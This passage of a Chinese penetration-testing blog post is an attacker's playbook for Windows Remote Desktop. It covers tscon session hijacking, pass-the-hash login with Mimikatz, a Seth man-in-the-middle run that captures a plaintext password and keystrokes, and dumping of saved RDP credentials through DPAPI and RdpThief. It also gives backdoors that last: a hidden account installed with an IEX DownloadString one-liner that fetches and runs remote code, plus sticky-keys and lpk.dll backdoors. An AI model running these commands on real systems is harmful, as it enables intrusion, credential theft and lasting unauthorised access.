命令即可成功切换至目标用户的远程桌面</p><pre class="line-numbers language-none"><code class="language-none">tscon 会话id /PASSWORD:要切换的用户密码eg:tscon 2 /PASSWORD:Bunny2021<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在 SYSTEM 权限下直接执行 tscon 会话切换命令， 不需要输入密码：</p><pre class="line-numbers language-none"><code class="language-none">tscon ID<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="高权限用户劫持低权限用户的-RDP"><a href="#高权限用户劫持低权限用户的-RDP" class="headerlink" title="高权限用户劫持低权限用户的 RDP"></a>高权限用户劫持低权限用户的 RDP</h3><p>高权限用户劫持低权限用户的 RDP 会话利用起来比较简单，由于具有管理员权限，可以直接通过创建服务等方式获取 SYSTEM 权限。</p><p>创建劫持用户会话的服务：</p><pre class="line-numbers language-none"><code class="language-none">sc create rdp binpath= "cmd.exe /k tscon 会话id /dest:会话名称"sc create rdp binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#4"      #修改为目标会话id和当前会话名sc start rdp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>执行<code>sc start rdp</code>后，我们创建的劫持会话的服务将会启动，</p><p>由于 Windows 是以 SYSTEM 权限运行服务的，所以我们<code>tscon 2</code>命令也会以 SYSTEM 权限运行，</p><p>此时便可以在不提供目标用户密码的情况下成功劫持目标用户的会话</p><h3 id="低权限用户劫持高权限用户的-RDP"><a href="#低权限用户劫持高权限用户的-RDP" class="headerlink" title="低权限用户劫持高权限用户的 RDP"></a>低权限用户劫持高权限用户的 RDP</h3><p>低权限用户想要劫持高权限用户的 RDP 的话需要想办法提权，即将自己的权限提升至 SYSTEM。</p><h1 id="八、哈希传递登录-RDP"><a href="#八、哈希传递登录-RDP" class="headerlink" title="八、哈希传递登录 RDP"></a>八、哈希传递登录 RDP</h1><p>Windows Server 2012 R2 采用了新版的 RDP 远程桌面协议，在这个新版协议中有一个 ” 受限管理员” （Restricted Admin）的特性。相信渗透测试人员和系统管理员都会对这个特性有足够的兴趣，因为通过这个特性，我们可以实现哈希传递攻击并成功登录远程桌面。</p><p>在抓取到的 Hash 无法破解的情况下，如果目标主机开启了 “Restricted Admin Mode” 也行，那么我们便可以使用 Hash 来直接实现 RDP 远程登录。Restricted Admin Mode 在 Windows 8.1 和 Windows Server 2012 R2 上默认开启。</p><p>我们在渗透过程中可以通过修改注册表的方式开启目标主机的 Restricted Admin Mode，值为 0 代表开启，值为 1 代表关闭：</p><pre class="line-numbers language-none"><code class="language-none">REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f# 查看是否成功开启REG query "HKLM\System\CurrentControlSet\Control\Lsa" | findstr "DisableRestrictedAdmin"    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后再攻击机上使用 Mimikatz 进行哈希传递，大致原理就是哈希传递成功后执行<code>mstsc.exe /restrictedadmin</code>来打开：</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::pth /user:administrator /domain:whoamianony.org /ntlm:ab89b1295e69d353dd7614c7a3a80cec "/run:mstsc.exe /restrictedadmin"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>注意，这里的受限管理员模式顾名思义只对管理员组有效。所以如果你获取到的用户属于远程桌面用户组，那么是无法通过 Hash 登录的。</p></blockquote><h1 id="九、多用户登录"><a href="#九、多用户登录" class="headerlink" title="九、多用户登录"></a>九、多用户登录</h1><h2 id="多用户登陆同一个账户"><a href="#多用户登陆同一个账户" class="headerlink" title="多用户登陆同一个账户"></a>多用户登陆同一个账户</h2><p><strong>Windows server 2012</strong><br>打开cmd，输入gpedit.msc 组策略，找到【计算机设置】–【管理模板】–【windows组件】–【远程桌面服务】–【远程桌面会话主机】–【连接】</p><p>按照以下步骤操作：<br>1、拒绝将已经登录到控制台会话的管理员注销—选择启用<br>2、限制连接的数量—选择启用，配置‘允许的RD最大连接数’为10个<br>3、将远程桌面服务用户限制到单独的远程桌面服务会话—选择禁用</p><p>打开管理员命令提示符运行</p><p><code>gpupdate /force </code></p><p><strong>Windows server 2008</strong><br>依次打开”管理工具”(控制面板或者”C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Administrative Tools")——”远程桌面服务”——”远程桌面会话主机配置”——双击”限制每个用户只能进行一个会话”——在弹出的对话框中把”限制每个用户只能进行一个会话”勾去掉——确定。</p><p>开始-运行-输入regedit打开注册表 ， 在右边找到  fSingleSessionPerUser  把值由1改为0</p><pre class="line-numbers language-none"><code class="language-none">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>命令操作</p><pre class="line-numbers language-none"><code class="language-none">reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /freg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="多用户登录不同账户"><a href="#多用户登录不同账户" class="headerlink" title="多用户登录不同账户"></a>多用户登录不同账户</h2><p>详情见：<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9A%84%E5%A4%9A%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95">渗透技巧——Windows系统远程桌面的多用户登录</a></p><p>非服务器版本的 Windows 系统默认只允许一个账户登录，远程登录时，</p><p>使用与原系统相同的账户，原系统将被切换到登录界面</p><p>使用不同的账户，登录时提示其他用户已登录到此计算机，</p><p>选择继续后，原系统桌面将弹框提示是否断开当前连接 (30 秒后默认选择同意，退回到登录界面)</p><h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h3><p>Mimikatz 开启多用户登录，支持Win 7 及以前的版本系统</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">mimikatz.exeprivilege::debugts::multirdp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>PS：使用与原系统相同的账户，原系统还是会被切换到登录界面；不同账户登陆成功</p></blockquote><h3 id="RDPwrap"><a href="#RDPwrap" class="headerlink" title="RDPwrap"></a>RDPwrap</h3><p>工程地址：<br><a href="https://github.com/stascorp/rdpwrap">https://github.com/stascorp/rdpwrap</a></p><p>工具地址：<br><a href="https://github.com/stascorp/rdpwrap/releases">https://github.com/stascorp/rdpwrap/releases</a></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">RDPwrap：支持Win Vista - Win10RDPWinst.exe -i is # 安装 RDPWinst.exe -u # 卸载RDPWinst.exe -i is # 安装 RDPWinst.exe -u # 卸载<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="SharpDoor"><a href="#SharpDoor" class="headerlink" title="SharpDoor"></a>SharpDoor</h3><p>仅使用于Win 10 开启多会话RDP</p><h1 id="十、RDP中间人攻击"><a href="#十、RDP中间人攻击" class="headerlink" title="十、RDP中间人攻击"></a>十、RDP中间人攻击</h1><p>中间人攻击通常会导致凭据捕获。同样的，在对 RDP 会话进行中间人攻击，攻击者可以获得一个登录用户的明文密码，用于后期的横向移动。当 RDP 爆破走不通时，我们不妨尝试一下中间人。</p><p>Seth 是一个用 Python 和 Bash 编写的 RDP 中间人攻击自动化工具，通过尝试降级连接用以提取明文凭证来实现 MitM RDP 连接，而不管网络级别的身份验证（NLA）是否启用。</p><p>项目地址：<a href="https://github.com/SySS-Research/Seth">https://github.com/SySS-Research/Seth</a></p><p>使用该工具所要求的环境：  </p><ul><li>Python 3</li><li>Tcpdump</li><li>Arpspoof</li><li>Openssl</li></ul><p>使用方法如下：</p><pre class="line-numbers language-none"><code class="language-none">./seth.sh &lt;INTERFACE&gt; &lt;ATTACKER_IP&gt; &lt;VICTIM_IP&gt; &lt;GATEWAY_IP|HOST_IP&gt; [&lt;COMMAND&gt;]INTERFACE：网卡ATTACKER IP：中间人 IPVICTIM IP：连接者 IPGATEWAY IP|HOST IP：被连接的远程主机 IPCOMMAND：启动时执行的命令执行以下命令启动 seth 监听：./seth.sh eth0 192.168.93.128 192.168.93.20 192.168.93.30<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后当 PC 上的用户远程登录 DC 时便会抓取到登录用户的明文密码。不仅如此，还可以对用户键盘的操作进行记录，甚至使用<code>&lt;COMMAND&gt;</code>在目标主机上执行命令。</p><p>详情请看：<a href="https://www.freebuf.com/sectool/178146.html">https://www.freebuf.com/sectool/178146.html</a></p><p>攻击成功后类似如下：</p><pre class="line-numbers language-none"><code class="language-none"># ./seth.sh eth0 192.168.93.128 192.168.93.20 192.168.93.30███████╗███████╗████████╗██╗  ██╗██╔════╝██╔════╝╚══██╔══╝██║  ██║   by Adrian Vollmer███████╗█████╗     ██║   ███████║   seth@vollmer.syss.de╚════██║██╔══╝     ██║   ██╔══██║   SySS GmbH, 2017███████║███████╗   ██║   ██║  ██║   https://www.syss.de╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝[*] SpoofinG arp replies...[*] TurninG on IP forwardinG...[*] Set iptables rules for SYN packets...[*] WaitinG for a SYN packet to the oriGinal destination...[+] Got it! OriGinal destination is 192.168.93.30[*] Clone the x509 certificate of the oriGinal destination...[*] Adjust the iptables rule for all packets...[*] Run RDP proxy...ListeninG for new connectionConnection received from 192.168.93.20:50431DownGradinG authentication options from 11 to 3Enable SSLalice::avollmer-syss:1f20645749b0dfd5:b0d3d5f1642c05764ca28450f89d38db:0101000000000000b2720f48f5ded2012692fcdbf5c79a690000000002001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0001001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0004001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0003001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0007000800b2720f48f5ded20106000400020000000800300030000000000000000100000000200000413a2721a0d955c51a52d647289621706d6980bf83a5474c10d3ac02acb0105c0a0010000000000000000000000000000000000009002c005400450052004d005300520056002f003100390032002e003100360038002e00350037002e00310030003200000000000000000000000000Tamper with NTLM responseTLS alert access denied, DownGradinG CredSSPConnection lostConnection received from 192.168.57.103:50409ListeninG for new connectionEnable SSLConnection lostConnection received from 192.168.57.103:50410ListeninG for new connectionEnable SSLHidinG forGed protocol request from client.\alice:ilovebobKeyboard Layout: 0x409 (EnGlish_United_States)Key press:   LShiftKey press:   SKey release:                 SKey release:                 LShiftKey press:   EKey release:                 EKey press:   CKey release:                 CKey press:   RKey release:                 RKey press:   EKey release:                 EKey press:   TKey release:                 TConnection lost[*] CleaninG up...[*] Done.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="十一、获取RDP远程桌面连接记录"><a href="#十一、获取RDP远程桌面连接记录" class="headerlink" title="十一、获取RDP远程桌面连接记录"></a>十一、获取RDP远程桌面连接记录</h1><p>在渗透测试中，远程桌面连接的历史记录不可忽视，根据历史记录往往能定位出关键的服务器。接下来我们就介绍一下如何导出 RDP 连接的历史记录。</p><p>获取 RDP 远程桌面连接记录可以通过枚举注册表完成，但是如果想要获得所有用户的历史记录，需要逐个获得用户的 NTUSER.DAT 文件，通过注册表加载配置单元，导入用户配置信息，再进行枚举才能够实现。</p><p>详情见：<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95">渗透技巧——获得Windows系统的远程桌面连接历史记录</a></p><h2 id="导出当前用户的历史记录"><a href="#导出当前用户的历史记录" class="headerlink" title="导出当前用户的历史记录"></a>导出当前用户的历史记录</h2><p>可以通过枚举下面的注册表键值查看当前用户的历史记录：</p><pre class="line-numbers language-none"><code class="language-none">HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以通过 PowerShell 命令行来实现，首先通过以下命令枚举指定注册表项下所有的的子项，即当前用户所连接过的所有的主机名：</p><pre class="line-numbers language-none"><code class="language-none">dir "Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" -Name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后使用以下命令查询指定注册表项的注册表键值，即查看连接所使用的用户名：</p><pre class="line-numbers language-none"><code class="language-none">(Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\192.168.93.30").UsernameHint<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下面给出一个三好学生写的枚举脚本：</p><pre class="line-numbers language-none"><code class="language-none">$RegPath = "Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\"$QueryPath = dir $RegPath -Nameforeach($Name in $QueryPath){       Try      {          $User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop | Out-Null).UsernameHint            Write-Host "Server:"$Name            Write-Host "User:"$User"`n"        }        Catch          {        Write-Host "No RDP Connections History"        }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="导出已登录用户的历史记录"><a href="#导出已登录用户的历史记录" class="headerlink" title="导出已登录用户的历史记录"></a>导出已登录用户的历史记录</h2><p>已登录用户的注册表信息会同步保存在<code>HKEY_USERS\&lt;SID&gt;</code>目录下，<code>&lt;SID&gt;</code>要对应每个用户的 SID：</p><p>几个用户，分别有几个子项。我们可以通过枚举注册表键值</p><p><code>HKEY_USERS\SID\Software\Microsoft\Terminal Server Client\Servers</code></p><p>就能够获得已登录用户的远程桌面连接历史记录：</p><blockquote><p>如果第三个用户未登录，此时是无法直接获得该用户的注册表信息的，会报错，也就无法直接导出该用户的远程桌面连接历史记录。</p></blockquote><p>最后给出一个三好学生写的枚举脚本：</p><pre class="line-numbers language-none"><code class="language-none">$AllUser = Get-WmiObject -Class Win32_UserAccountforeach($User in $AllUser){$RegPath = "Registry::HKEY_USERS\"+$User.SID+"\Software\Microsoft\Terminal Server Client\Servers\"Write-Host "User:"$User.NameWrite-Host "SID:"$User.SIDWrite-Host "Status:"$User.StatusTry  { $QueryPath = dir $RegPath -Name -ErrorAction Stop}Catch{Write-Host "No RDP Connections History"Write-Host "----------------------------------"continue}foreach($Name in $QueryPath){   Try  {  $User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop).UsernameHintWrite-Host "Server:"$NameWrite-Host "User:"$User}Catch  {Write-Host "No RDP Connections History"}}Write-Host "----------------------------------" }<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="导出所有用户的历史记录"><a href="#导出所有用户的历史记录" class="headerlink" title="导出所有用户的历史记录"></a>导出所有用户的历史记录</h2><p>前面刚说了，对于未登录用户，无法直接获得注册表配置信息，那有什么解决办法？其实这里可以通过加载配置单元的方式来解决，即打开用户的 NTUSER.DAT 文件，加载配置单元导入用户配置信息，然后进行枚举。</p><p>选中 HKEY_USERS 项，点击“文件” —&gt; “加载配置单元”，如下图：</p><p>选择打开用户的 NTUSER.DAT 文件，</p><p>路径为<code>C:\Documents and Settings\用户名\NTUSER.DAT</code></p><p>接着指定一个项名称，即可在 HKEY_USERS 下读取该用户的注册表配置信息</p><p>此外，也可以通过命令行实现加载配置单元的实例：</p><pre class="line-numbers language-none"><code class="language-none">Reg load HKEY_USERS\testmoretz C:\Documents and Settings\moretz\NTUSER.DAT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后给出一个三好学生写的枚举脚本：<br><a href="https://github.com/3gstudent/List-RDP-Connections-History">https://github.com/3gstudent/List-RDP-Connections-History</a></p><h1 id="十二、获取连接过的RDP密码"><a href="#十二、获取连接过的RDP密码" class="headerlink" title="十二、获取连接过的RDP密码"></a>十二、获取连接过的RDP密码</h1><p>在获取内网机器管理员权限后，查看是否有保存到本地的RDP连接密码，对保存到本地的RDP连接密码进行解密，解密成功后可使用此凭据继续横向移动。</p><h2 id="保存了RDP-凭证"><a href="#保存了RDP-凭证" class="headerlink" title="保存了RDP 凭证"></a>保存了RDP 凭证</h2><p>Windows保存RDP凭据的目录是：<br><code>C:\Users\用户名\AppData\Local\Microsoft\Credentials</code></p><h3 id="查看保存在本地的远程主机信息"><a href="#查看保存在本地的远程主机信息" class="headerlink" title="查看保存在本地的远程主机信息"></a>查看保存在本地的远程主机信息</h3><p><code>cmdkey /list</code><br>注意:cmdkey /list命令务必在Session会话下执行，system下执行无结果。</p><p>或者使用powerpick查看<br><code>powerpick Get-ChildItem C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials\ -Force</code></p><p>查看本地用户此目录下是否存有RDP密码文件,这条命令只能在cmd中执行!!! powershell无法使用<br><code>dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*</code>  </p><h3 id="查看连接记录"><a href="#查看连接记录" class="headerlink" title="查看连接记录"></a>查看连接记录</h3><p>查看本地机器本地连接过的目标机器。</p><pre class="line-numbers language-none"><code class="language-none">reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以使用三好学生的ps脚本<br><a href="https://github.com/3gstudent/List-RDP-Connections-History">https://github.com/3gstudent/List-RDP-Connections-History</a></p><h3 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h3><h4 id="一、mimikatz"><a href="#一、mimikatz" class="headerlink" title="一、mimikatz"></a>一、mimikatz</h4><pre class="line-numbers language-none"><code class="language-none">// 选择一个密码文件对其进行解密，获取guidMasterKey和pbData的值，// pbData是我们要解密的数据，guidMasterKey是解密所需要的密钥。// 待会要通过guidMasterKey找对应的Masterkey。// SESSIONID 即为  %userprofile%\AppData\Local\Microsoft\Credentials\  目录下的一个文件夹名mimikatz # dpapi::cred /in:C:\Users\USERNAME\AppData\Local\Microsoft\Credentials\SESSIONIDeg:mimikatz # privilege::debugmimikatz # dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\8781378F7D47006A4FC98D2F8A266F58// 如果你没有获得到解码凭证则需要手动携带Masterkey// 根据guidMasterKey找到对应的Masterkey,这里LSASS已经在其缓存中存有这个key因此我们可以使用SeDebugPrivilege获取。mimikatz # sekurlsa::dpapi// 通过Masterkey解密出明文RDP连接密码。mimikatz "dpapi::cred /in:C:\Users\USERNAME\Desktop\test\SESSION /masterkey:GUID key对应的masterkey"eg:mimikatz "dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\8781378F7D47006A4FC98D2F8A266F58 /masterkey:1df6b7a86b7aa3238c6899b1b4fd7b4ccba852db9b2ea611bbb7943f34b788f55d27835591ccde1e6c643d9aca724fd495282f5fc92ee80746262d8759b9d23d"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="二、netpass"><a href="#二、netpass" class="headerlink" title="二、netpass"></a>二、netpass</h4><p>nirsoft密码恢复工具介绍：<a href="https://www.nirsoft.net/password_recovery_tools.html">nirsoft</a>  </p><p>全套工具下载  <a href="https://www.nirsoft.net/protected_downloads/passreccommandline.zip">https://www.nirsoft.net/protected_downloads/passreccommandline.zip</a><br>用户名：download  密码：nirsoft123!    解压密码：nirsoft123!</p><p>netpass下载<br>x86<br><a href="https://www.nirsoft.net/toolsdownload/netpass.zip">https://www.nirsoft.net/toolsdownload/netpass.zip</a><br>x64<br><a href="https://www.nirsoft.net/toolsdownload/netpass-x64.zip">https://www.nirsoft.net/toolsdownload/netpass-x64.zip</a>  </p><p>使用：<br>双击netpass.exe</p><h4 id="三、其他"><a href="#三、其他" class="headerlink" title="三、其他"></a>三、其他</h4><p>powershell脚本自动化解密…</p><h2 id="未保存RDP凭证"><a href="#未保存RDP凭证" class="headerlink" title="未保存RDP凭证"></a>未保存RDP凭证</h2><blockquote><p>SharpRDPThief 是 RDPThief 的 C# 实现。它使用 EasyHook 将一个 DLL 注入 mstsc.exe，然后它会挂钩 CryptProtectMemory api 调用。hook 将从传递给 CryptProtectMemory 的地址中获取密码，然后通过 EasyHook 的 IPC 服务器将其发送到主进程。</p></blockquote><p><a href="https://github.com/0x09AL/RdpThief">https://github.com/0x09AL/RdpThief</a><br><a href="https://github.com/passthehashbrowns/SharpRDPThief">https://github.com/passthehashbrowns/SharpRDPThief</a></p><p>目前这只是概念实现的证明，需要 RDPHook.dll 与 SharpRDPThief.exe 位于同一目录中。</p><p>RdpThief 本身是一个独立的 DLL，当它被注入到 mstsc.exe 进程中时，将执行 API 挂钩，提取明文凭据并将它们保存到文件中。</p><p>当在 Cobalt Strike 上加载 aggressor 脚本时，有三个命令可用：</p><pre class="line-numbers language-none"><code class="language-none">rdpthief_enable – 启用新 mstsc.exe 进程的心跳检查并注入它们。rdpthief_disable – 禁用新 mstsc.exe 的心跳检查，但不会卸载已加载的 DLL。rdpthief_dump – 打印提取的凭据（如果有就会打印出来）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>参考文章：<br><a href="https://mp.weixin.qq.com/s/uHnDlHbOVGnqzZdj8UnXIg">https://mp.weixin.qq.com/s/uHnDlHbOVGnqzZdj8UnXIg</a><br><a href="https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/">https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/</a></p><h1 id="十三、与远程桌面相关的权限维持方法"><a href="#十三、与远程桌面相关的权限维持方法" class="headerlink" title="十三、与远程桌面相关的权限维持方法"></a>十三、与远程桌面相关的权限维持方法</h1><h2 id="Windows-系统隐藏账户"><a href="#Windows-系统隐藏账户" class="headerlink" title="Windows 系统隐藏账户"></a>Windows 系统隐藏账户</h2><p>利用工具： </p><ul><li><a href="https://github.com/3gstudent/Windows-User-Clone">3gstudent/Windows-User-Clone: Create a hidden account</a></li></ul><pre class="line-numbers language-none"><code class="language-none"># 添加用户并隐藏IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3gstudent/Windows-User-Clone/master/Windows-User-Clone.ps1')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><a href="https://github.com/An0nySec/ShadowUser">https://github.com/An0nySec/ShadowUser</a></li></ul><p>详情参考： <a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F">渗透技巧——Windows系统的帐户隐藏</a></p><h2 id="Windows-粘滞键与辅助功能后门"><a href="#Windows-粘滞键与辅助功能后门" class="headerlink" title="Windows 粘滞键与辅助功能后门"></a>Windows 粘滞键与辅助功能后门</h2><p>参考文章：<a href="https://www.cnblogs.com/BOHB-yunying/p/11695140.html">https://www.cnblogs.com/BOHB-yunying/p/11695140.html</a>    </p><h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><p>Metasploit 中的<code>post/windows/manage/sticky_keys</code>模块可实现自动化地利用沾滞键的权限维持技术。  </p><p>该模块将用 cmd.exe 替换那些辅助功能的二进制文件（sethc、osk、disp、utilman）：</p><p>使用方法如下：</p><pre class="line-numbers language-none"><code class="language-none">use post/windows/manage/sticky_keysset session 6set target UTILMANexploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>此时，我们开启目标主机的远程桌面，当我们点击左下角的辅助功能按钮后，成功弹出了 CMD 窗口，并且为 SYSTEM 权限的：</p><p>不仅是 CMD，我们还可以换成任意的 Payload 用于钓鱼，当受害者使用响应功能时便会触发 Payload 实施攻击。</p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>如果你在电脑上连按五次 shift 键，你就会发现电脑屏幕上弹出了一个叫做 “粘滞键” 的程序，</p><p>在不知道用户账户密码，没有登录进系统之前，连按五次 shift 键也可以弹出这个程序，也称之为shift后门</p><p>但是首先得需要进入远程桌面登录界面，需要关闭鉴权和securitylayer验证，参考本文开篇。</p><p>粘滞键程序名称为 “sethc.exe”，其路径为 “c:\windows\system32\sethc.exe”。</p><p>**类似程序 **</p><ul><li><p>放大镜 Magnify.exe   win 和 + 同时按</p></li><li><p>讲述人 Narrator.exe  win 和 enter 同时按</p></li></ul><h3 id="制作过程"><a href="#制作过程" class="headerlink" title="制作过程"></a>制作过程</h3><p>利用粘滞键做后门是一种比较常见的持续控制方法。其基本流程如下：</p><blockquote><p>首先，我们手动或利用工具，找到 sethc.exe 将其删除或改名为 sethc.exe.bak(非必要)</p><p>接着将 cmd.exe 程序复制一个副本，并命名为 “sethc.exe”，替换原来的sethc.exe</p><p>最后，重启计算机再次按下 5 次 Shift 键时，就会弹出 CMD 界面，后门制作成功。</p></blockquote><p>制作的方法如下，在目标主机上执行如下命令即可：</p><pre class="line-numbers language-none"><code class="language-none">// 将sethc.exe重命名备份move C:\WINDOWS\system32\sethc.exe C:\WINDOWS\system32\sethc.exe.bak  // 将一个cmd.exe副本保存伪装成sethc.execopy C:\WINDOWS\system32\cmd.exe C:\windows\system32\sethc.exe       <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时，我们打开目标主机的远程桌面，连续按下五次 shift 键，便可以看到目标主机屏幕上成功弹出了一个 CMD 窗口</p><p>一般情况下，即使是 SYSTEM 权限也是无法修改 sethc.exe 的，只有 TrustedInstaller 权限才可以。</p><p><strong>解决办法一：</strong> </p><p>修改的文件右击 –&gt; 属性 –&gt; 安全 –&gt; 高级 –&gt; 更改所有者 –&gt; 当前用户 –&gt; 确定 –&gt; 重复之前步骤知道高级 –&gt; 编辑权限为完全控制</p><p><strong>解决办法二：</strong> </p><p>出现这样的情况我们就需要将将权限目录下的所有文件及文件夹、子文件夹下的所有者更改为管理员组(administrators)命令</p><pre class="line-numbers language-none"><code class="language-none">takeown /f c:\windows\system32\*.*   /a /r /d y// 目录下的文件、子文件夹的NTFS权限修改为仅管理员组(administrators)完全控制cacls  c:\windows\system32\*.*  /T /E /G administrators:F// 如果提权后是system权限，需要在转化cacls  c:\windows\system32\*.*  /T /E /G system:F<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>解决办法三：</strong> </p><p>模拟一个 TrustedInstaller 权限的令牌获取 TrustedInstaller 权限，然后再执行上述操作。我们的思路如下：</p><p>当我们启动 TrustedInstaller 服务时， 会启动进程 TrustedInstaller.exe，</p><p>该程序的权限为 NT SERVICE\TrustedInstaller，那么我们就可以窃取该进程的令牌。</p><p>首先进入 shell 启动 TrustedInstaller 服务：</p><pre class="line-numbers language-none"><code class="language-none">sc.exe start TrustedInstaller       # 先进入shell启动TrustedInstaller服务<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后执行如下即可：</p><pre class="line-numbers language-none"><code class="language-none">use incognitops      # 找到TrustedInstaller的进程PID，这里为3476steal_token &lt;PID&gt;      # 从该进程中窃取令牌getuid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>此时便可以对 sethc.exe 进行任何操作了。</p><h2 id="Lpk后门"><a href="#Lpk后门" class="headerlink" title="Lpk后门"></a>Lpk后门</h2><blockquote><p>一般系统都存在lpk.dll文件，该文件位于C:\WINDOWS\system32和C:WINDOWS\system\dllcache目录下。当exe文件运行时，lpk.dll就会被Windows动态链接，系统会先从当前目录查找，然后在到系统目录查找并加载。下面使用工具生成木马并保存为lpk.dll。我们要做的就是替换系统的lpk.dll文件。</p></blockquote><p>将这个文件替换系统自带的文件，并按5次shift键，系统就会运行sethc.exe程序，进而lpk.dll就会被Windows动态链接，</p><p>同时按下我们设置的键(我设置的是65和83，即一起按下AS键)，输入我们设置的密码，</p><p>最终弹出我们的shell窗口，添加账号后即可登录。</p><p><img src="https://mochazz.github.io/img/shift/s4.png"></p><h1 id="十四、与远程桌面相关的漏洞"><a href="#十四、与远程桌面相关的漏洞" class="headerlink" title="十四、与远程桌面相关的漏洞"></a>十四、与远程桌面相关的漏洞</h1><h2 id="DOS-攻击"><a href="#DOS-攻击" class="headerlink" title="DOS 攻击"></a>DOS 攻击</h2><p>这一利用借助的是 2012 年爆出来的 MS12-020 远程桌面协议 RDP 远程代码执行漏洞（CVE-2012-0002）。  </p><p>该漏洞是由于 Windows 在处理某些对象时存在错误，可通过特制的 RDP 